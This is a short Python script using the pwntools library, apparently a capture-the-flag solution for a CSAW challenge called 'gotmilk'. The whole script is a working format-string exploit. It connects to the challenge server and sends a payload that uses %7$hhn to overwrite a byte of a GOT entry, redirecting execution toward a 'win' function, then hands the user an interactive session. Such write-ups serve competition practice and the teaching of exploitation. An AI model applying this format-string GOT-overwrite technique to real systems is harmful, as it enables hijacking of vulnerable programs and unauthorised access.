from pwn import *

r = remote("pwn.chal.csaw.io", 1004)#process("./gotmilk")
win_off = 0x00001189
lose_got = 0x804a010
off = int(0x89-4)
fmt = p32(lose_got)+"%"+str(off)+"x"+"%7$hhn"
r.sendline(fmt)
r.interactive()
